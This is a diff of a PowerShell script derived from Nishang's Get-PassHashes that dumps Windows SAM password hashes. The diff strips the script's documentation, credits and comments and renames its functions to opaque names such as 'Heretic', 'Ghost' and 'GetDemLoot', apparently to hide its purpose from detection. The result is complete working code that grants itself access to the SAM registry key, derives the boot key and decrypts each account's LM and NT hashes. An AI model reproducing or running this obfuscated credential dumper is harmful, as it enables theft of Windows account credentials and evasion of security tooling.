@@ -1,46 +1,17 @@
-function Get-PassHashes { 
-<# 
-.SYNOPSIS 
-Nishang payload which dumps password hashes. 
- 
-.DESCRIPTION 
-The payload dumps password hashes using the modified powerdump script from MSF. Administrator privileges are required for this script
-(but not SYSTEM privs as for the original powerdump written by David Kennedy)
+function DumpSAM { 
 
-.EXAMPLE 
-PS > Get-PassHashes
-Run above from an elevated shell.
-
-
-.EXAMPLE 
-PS > Get-PassHashes -PSObjectFormat
-Use above to receive the hashes output as a PSObject.
- 
-.LINK 
-http://www.labofapenetrationtester.com/2013/05/poshing-hashes-part-2.html?showComment=1386725874167#c8513980725823764060
-https://github.com/samratashok/nishang
-
-.Notes
-Reflection added by https://github.com/Zer1t0
-
-#> 
 [CmdletBinding()]
 Param (
     [Switch]$PSObjectFormat
 )
 
 $script:PowerDump = $null
-function LoadApi
+function narrows
 {
-    # https://blogs.technet.microsoft.com/heyscriptingguy/2013/06/27/use-powershell-to-interact-with-the-windows-api-part-3/
     $DynAssembly = New-Object System.Reflection.AssemblyName('Win32Lib')
     $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
     $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Lib', $False)
     $TypeBuilder = $ModuleBuilder.DefineType('PowerDump', 'Public, Class')
-
-    #######################################################################
-    # [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
-    # public static extern int RegOpenKeyEx(int hKey, string subKey, int ulOptions, int samDesired, out int hkResult);
     $PInvokeMethod = $TypeBuilder.DefineMethod(
         'RegOpenKeyEx',
         [Reflection.MethodAttributes] 'Public, Static',
@@ -49,7 +20,6 @@ function LoadApi
     )
 
     $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
-
     $FieldArray = [Reflection.FieldInfo[]] @(
         [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
         [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
@@ -66,9 +36,6 @@ function LoadApi
         $FieldValueArray
     )
     $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
-    ##########################################################################
-    #[DllImport("advapi32.dll", EntryPoint="RegQueryInfoKey", CallingConvention=CallingConvention.Winapi, SetLastError=true)]
-    #extern public static int RegQueryInfoKey(int hkey, StringBuilder lpClass, ref int lpcbClass, int lpReserved, out int lpcSubKeys, out int lpcbMaxSubKeyLen, out int lpcbMaxClassLen, out int lpcValues, out int lpcbMaxValueNameLen, out int lpcbMaxValueLen, out int lpcbSecurityDescriptor, IntPtr lpftLastWriteTime);
     $PInvokeMethod = $TypeBuilder.DefineMethod(
         'RegQueryInfoKey',
         [Reflection.MethodAttributes] 'Public, Static',
@@ -107,7 +74,6 @@ function LoadApi
     )
 
     $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
-
     $FieldArray = [Reflection.FieldInfo[]] @(
         [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
         [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
@@ -124,12 +90,8 @@ function LoadApi
         $FieldValueArray
     )
     $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
-    ################################################################################
-    
     $script:PowerDump = $TypeBuilder.CreateType()
 }
-
-#######################################powerdump written by David Kennedy#########################################
 
 $antpassword = [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0");
 $almpassword = [Text.Encoding]::ASCII.GetBytes("LMPASSWORD`0");
@@ -154,7 +116,7 @@ $odd_parity = @(
   241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
 );
 
-function sid_to_key($sid)
+function Heretic($sid)
 {
     $c0 = $sid -band 255
     $c1 = ($sid -band 65280)/256
@@ -164,10 +126,10 @@ function sid_to_key($sid)
     $s1 = @($c0, $c1, $c2, $c3, $c0, $c1, $c2)
     $s2 = @($c3, $c0, $c1, $c2, $c3, $c0, $c1) 
 
-    return ,((str_to_key $s1),(str_to_key $s2))
+    return ,((HighGround $s1),(HighGround $s2))
 }
 
-function str_to_key($s)
+function HighGround($s)
 {
     $k0 = [int][math]::Floor($s[0] * 0.5)
     $k1 = ( $($s[0] -band 0x01) * 64) -bor [int][math]::Floor($s[1] * 0.25)
@@ -177,9 +139,7 @@ function str_to_key($s)
     $k5 = ( $($s[4] -band 0x1F) * 4) -bor [int][math]::Floor($s[5] * 0.015625)
     $k6 = ( $($s[5] -band 0x3F) * 2) -bor [int][math]::Floor($s[6] * 0.0078125)
     $k7 = $($s[6] -band 0x7F)
-
-    $key = @($k0, $k1, $k2, $k3, $k4, $k5, $k6, $k7)
-
+    $key = @($k0, $k1, $k2, $k3, $k4, $k5, $k6, $k7) 
     0..7 | %{
         $key[$_] = $odd_parity[($key[$_] * 2)]
     }
@@ -187,7 +147,7 @@ function str_to_key($s)
     return ,$key
 }
 
-function NewRC4([byte[]]$key)
+function Ghost([byte[]]$key)
 {
     return new-object Object |
     Add-Member NoteProperty key $key -PassThru |
@@ -219,17 +179,17 @@ function NewRC4([byte[]]$key)
     } -PassThru
 }
 
-function des_encrypt([byte[]]$data, [byte[]]$key)
+function NamFunc1([byte[]]$data, [byte[]]$key)
 {
-    return ,(des_transform $data $key $true)
+    return ,(NamFunc3 $data $key $true)
 }
 
-function des_decrypt([byte[]]$data, [byte[]]$key)
+function NamFunc2([byte[]]$data, [byte[]]$key)
 {
-    return ,(des_transform $data $key $false)
+    return ,(NamFunc3 $data $key $false)
 }
 
-function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)
+function NamFunc3([byte[]]$data, [byte[]]$key, $doEncrypt)
 {
     $des = new-object Security.Cryptography.DESCryptoServiceProvider;
     $des.Mode = [Security.Cryptography.CipherMode]::ECB;
@@ -243,7 +203,7 @@ function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)
     return ,$result;
 }
 
-function Get-RegKeyClass([string]$key, [string]$subkey)
+function NamFunc4([string]$key, [string]$subkey)
 {
     switch ($Key) {
         "HKCR" { $nKey = 0x80000000} #HK Classes Root
@@ -281,18 +241,16 @@ function Get-RegKeyClass([string]$key, [string]$subkey)
     }
     return $result;
 }
-
-function Get-BootKey
+function SuperKey
 {
-    $s = [string]::Join("",$("JD","Skew1","GBG","Data" | %{Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"}));
+    $s = [string]::Join("",$("JD","Skew1","GBG","Data" | %{NamFunc4 "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"}));
     $b = new-object byte[] $($s.Length/2);
     0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)}
     $b2 = new-object byte[] 16;
     0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | % -begin{$i=0;}{$b2[$i]=$b[$_];$i++}
     return ,$b2;
 }
-
-function Get-HBootKey
+function SuperKeyH
 {
     param([byte[]]$bootkey);
     $aqwerty = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0");
@@ -302,31 +260,26 @@ function Get-HBootKey
     [byte[]]$F = $k.GetValue("F");
     if (-not $F) {return $null}
     $rc4key = [Security.Cryptography.MD5]::Create().ComputeHash($F[0x70..0x7F] + $aqwerty + $bootkey + $anum);
-    $rc4 = NewRC4 $rc4key;
+    $rc4 = Ghost $rc4key;
     return ,($rc4.encrypt($F[0x80..0x9F]));
 }
-
-function Get-UserName([byte[]]$V)
+function UserGet([byte[]]$V)
 {
     if (-not $V) {return $null};
     $offset = [BitConverter]::ToInt32($V[0x0c..0x0f],0) + 0xCC;
     $len = [BitConverter]::ToInt32($V[0x10..0x13],0);
     return [Text.Encoding]::Unicode.GetString($V, $offset, $len);
 }
-
-function Get-UserHashes($u, [byte[]]$hbootkey)
+function SimpleBytes($u, [byte[]]$hbootkey)
 {
     [byte[]]$enc_lm_hash = $null; [byte[]]$enc_nt_hash = $null;
     
-    # check if hashes exist (if byte memory equals to 20, then we've got a hash)
     $LM_exists = $false;
     $NT_exists = $false;
-    # LM header check
     if ($u.V[0xa0..0xa3] -eq 20)
     {
         $LM_exists = $true;
     }
-    # NT header check
     elseif ($u.V[0xac..0xaf] -eq 20)
     {
         $NT_exists = $true;
@@ -345,57 +298,53 @@ function Get-UserHashes($u, [byte[]]$hbootkey)
         $nt_hash_offset = $u.HashOffset + 8;
         $enc_nt_hash = [byte[]]$u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
     }
-    return ,(DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey);
+    return ,(Moilanto $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey);
 }
 
-function DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)
+function Moilanto($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)
 {
     [byte[]]$lmhash = $empty_lm; [byte[]]$nthash=$empty_nt;
-    # LM Hash
     if ($enc_lm_hash)
     {
-        $lmhash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword;
+        $lmhash = Rifle2 $rid $hbootkey $enc_lm_hash $almpassword;
     }
 
     # NT Hash
     if ($enc_nt_hash)
     {
-        $nthash = DecryptSingleHash $rid $hbootkey $enc_nt_hash $antpassword;
+        $nthash = Rifle2 $rid $hbootkey $enc_nt_hash $antpassword;
     }
 
     return ,($lmhash,$nthash)
 }
-
-function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr)
+function Rifle2($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr)
 {
-    $deskeys = sid_to_key $rid;
+    $deskeys = Heretic $rid;
     $md5 = [Security.Cryptography.MD5]::Create();
     $rc4_key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr);
-    $rc4 = NewRC4 $rc4_key;
+    $rc4 = Ghost $rc4_key;
     $obfkey = $rc4.encrypt($enc_hash);
-    $hash = (des_decrypt  $obfkey[0..7] $deskeys[0]) +
-        (des_decrypt $obfkey[8..$($obfkey.Length - 1)] $deskeys[1]);
+    $hash = (NamFunc2  $obfkey[0..7] $deskeys[0]) +
+        (NamFunc2 $obfkey[8..$($obfkey.Length - 1)] $deskeys[1]);
     return ,$hash;
 }
-
-function Get-UserKeys
+function GetDemLoot
 {
     ls HKLM:\SAM\SAM\Domains\Account\Users |
         where {$_.PSChildName -match "^[0-9A-Fa-f]{8}$"} |
             Add-Member AliasProperty KeyName PSChildName -PassThru |
             Add-Member ScriptProperty Rid {[Convert]::ToInt32($this.PSChildName, 16)} -PassThru |
             Add-Member ScriptProperty V {[byte[]]($this.GetValue("V"))} -PassThru |
-            Add-Member ScriptProperty UserName {Get-UserName($this.GetValue("V"))} -PassThru |
+            Add-Member ScriptProperty UserName {UserGet($this.GetValue("V"))} -PassThru |
             Add-Member ScriptProperty HashOffset {[BitConverter]::ToUInt32($this.GetValue("V")[0x9c..0x9f],0) + 0xCC} -PassThru
 }
-
-function DumpHashes
+function GetThings
 {
-    LoadApi
-    $bootkey = Get-BootKey;
-    $hbootKey = Get-HBootKey $bootkey;
-    Get-UserKeys | %{
-        $hashes = Get-UserHashes $_ $hBootKey;
+    Narrows
+    $bootkey = SuperKey;
+    $hbootKey = SuperKeyH $bootkey;
+    GetDemLoot | %{
+        $hashes = SimpleBytes $_ $hBootKey;
         if($PSObjectFormat)
         {
             $creds = New-Object psobject
@@ -413,8 +362,6 @@ function DumpHashes
         }
     }
 }
-
-    #http://www.labofapenetrationtester.com/2013/05/poshing-hashes-part-2.html?showComment=1386725874167#c8513980725823764060
     if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
     {
         Write-Warning "Script requires elevated or administrative privileges."
@@ -422,7 +369,6 @@ function DumpHashes
     } 
     else
     {
-        #Set permissions for the current user.
         $rule = New-Object System.Security.AccessControl.RegistryAccessRule (
         [System.Security.Principal.WindowsIdentity]::GetCurrent().Name,
         "FullControl",
@@ -436,15 +382,10 @@ function DumpHashes
         $acl = $key.GetAccessControl()
         $acl.SetAccessRule($rule)
         $key.SetAccessControl($acl)
-
-        DumpHashes
-
-        #Remove the permissions added above.
+        GetThings
         $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
         $acl.Access | where {$_.IdentityReference.Value -eq $user} | %{$acl.RemoveAccessRule($_)} | Out-Null
         Set-Acl HKLM:\SAM\SAM\Domains $acl
-
     }
 }
-
 
